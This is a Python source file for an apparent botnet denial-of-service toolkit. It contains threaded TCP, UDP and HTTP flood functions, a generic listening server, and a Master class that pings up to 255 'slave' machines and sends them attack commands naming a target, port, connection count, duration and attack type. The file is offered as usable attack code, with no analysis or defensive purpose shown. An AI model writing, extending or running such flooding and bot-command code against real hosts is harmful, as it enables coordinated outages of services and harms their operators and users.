import time 
import socket
import random
import threading
from threading import Thread

openSocks = []

def Log(event) :
    return "[{}] {}".format(time.ctime(),event)

def getTCPSocket() :
    '''
    Function to create TCP socket
    '''
    return socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def getUDPSocket() :
    '''
    Function to create UDP socket
    '''
    return socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

def close() :
    for sock in openSocks :
        try :
            sock.close()
        except OSError :
            pass 
        finally :
            del sock

def send(sock,target,port,duration,message,close=True) :
    '''
    Function to send command To Slave
    '''
    try :
        openSocks.append(sock)
        sock.settimeout(4)
        sock.connect((target,port))
        sock.send(message.encode())
        time.sleep(duration) 
        if close :
            sock.close()
    except socket.timeout:
        pass
    except Exception as e :
        print(Log(f"Error {target} {port} {message} : {e}"))
    
    return

def tcpAttack(target,port,count,duration) :
    tcpThreads = []

    # Create Thread for Each Port
    for _ in range(count) :
        socket = getTCPSocket()
        tcpThreads.append(Thread(target=send,args=(socket,target,port,duration,' '*100)))

    # Start Threads
    for thread in tcpThreads :
        thread.start()

    # Join Threads
    for thread in tcpThreads :
        thread.join()

    close()

def udpAttack(target,port,count,duration) :
    udpThreads = []

    # Create Thread for Each Port
    for _ in range(count) :
        socket = getUDPSocket()
        udpThreads.append(Thread(target=send,args=(socket,target,port,duration,' '*100)))
    
    # Start Threads
    for thread in udpThreads :
        thread.start()

    # Join Threads
    for thread in udpThreads :
        thread.join()

    close()

def getMessage(message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000))))

def httpAttack(target,port,count,duration) :
    tcpThreads = []

    headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5",
            ''
        ]

    message = getMessage('GET /?')
    message += '\r\n'.join(headers)

    # Create Thread for Each Port
    for _ in range(count) :
        socket = getTCPSocket()
        tcpThreads.append(Thread(target=send,args=(socket,target,port,duration,message)))
    
    # Start Threads
    for thread in tcpThreads :
        thread.start()

    # Join Threads
    for thread in tcpThreads :
        thread.join()

    close()


class Server :
    def __init__(self,addr=('0.0.0.0',10000)) :
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.ReadBuffer = 8192
        self.addr = addr
        self.sock.bind(addr)
        self.running = True
    def start(self) :
        self.sock.listen(50)
        print(Log("Listening At {}:{}".format(self.addr[0],self.addr[1])))
        while self.running :
            cl , addr = self.sock.accept()
            # print(Log("Accepted connection from {}:{}".format(addr[0],addr[1])))
            self.handle_accepted(cl,addr)
    def handle_accepted(self,cl,addr) :
        """
        Currently handling "parallelism" by multithreading"""
        thread = Thread(target=self.handle_io,args=(cl,addr,))
        thread.start()
    def handle_io(self,cl,addr) :
        """
        Should Be Overridden in child class
        Or Will Funcion as Echo server"""
        client = cl 
        client.send('Welcome\n'.encode())
        while True :
            try :
                client.send(">>> ".encode())
                a = client.recv(self.ReadBuffer)
                client.send(a)
                if 'exit' in a.decode() :
                    client.close()
                    break
            except OSError :
                print(Log("OSError {}".format(addr)))
                client.close()
                break
            except BaseException as e :
                print(Log("{} cause by {}".format(e,addr)))
                break
            finally :
                print(Log("Connection with {} terminated".format(addr)))

class Master :
    def __init__(self,slaves = []) :
        print(Log("Master Initialization Started"))
        if len(slaves) > 255 :
            raise Exception("Master Cannot Handle More Than 255 Slaves Currently")
        # List of Slave IPs
        self.slaves = slaves

        # List of Active Slaves
        self.up = []

        # Port of bot slaves
        self.bPort = 60000

        # Read Buffer Size
        self.ReadBuffer = 4096

        print(Log("Checking Slaves"))
        self.ping()
        print(Log("Master Online"))

    def upCheck(self,sock,slave) :
        '''
        Function To Send Pingcode to Slave
        '''
        port = self.bPort
        try :
            # print(Log(f"Trying To Connect To {slave}"))
            sock.settimeout(3)
            sock.connect((slave,port))
            sock.send("ping".encode())
            print(Log(f"{slave} is up"))
            self.up.append(slave)
            sock.close()
        except socket.timeout:
            # print(Log(f"{slave} is down"))
            pass
        except Exception as e :
            print(Log(f"Error {slave} {port} {e}"))
            
    def ping(self) :
        '''
        Function To Check Slaves Which are Active
        '''
        self.up = []
        port = self.bPort
        threads = []
        for i in range(len(self.slaves)) :
            sock = getTCPSocket()
            slave = self.slaves[i]
            t = Thread(target=self.upCheck,args=(sock,slave,))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()

    def killSlaves(self) :
        '''
        Function to Terminate Slaves
        '''
        port = self.bPort
        print(self.up)
        threads = []
        for slave in self.up :
            sock = getTCPSocket()
            t = Thread(target=self.send,args=(sock,slave,'kill',))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()
        self.up = []
    
    def addSlave(self,slave) :
        '''
        Function to Add Slave
        '''
        self.slaves.append(slave)
        self.ping()

    def removeSlave(self,slave) :
        '''
        Function to Remove Slave
        '''
        if slave in self.slaves :
            self.slaves.remove(slave)
            self.ping()
        else :
            print(Log("IP not a slave"))
    
    def send(self,sock,slave,message) :
        '''
        Function to send command To Slave
        '''
        port = self.bPort
        try :
            sock.settimeout(3)
            sock.connect((slave,port))
            sock.send(message.encode())
            sock.close()
        except socket.timeout:
            pass
        except Exception as e :
            print(Log(f"Error {slave} {port} {message} : {e}"))
    
    def attack(self,target,port,count,duration,aType,slaves) :
        '''
        Function to start Attack
        '''
        threads = []
        for slave in self.up[:slaves] :
            sock = getTCPSocket()
            t = Thread(target=self.send,args=(sock,slave,f'attack:{target}:{port}:{count}:{duration}:{aType}'))
            t.start()
            threads.append(t)
        for thread in threads :
            thread.join()
        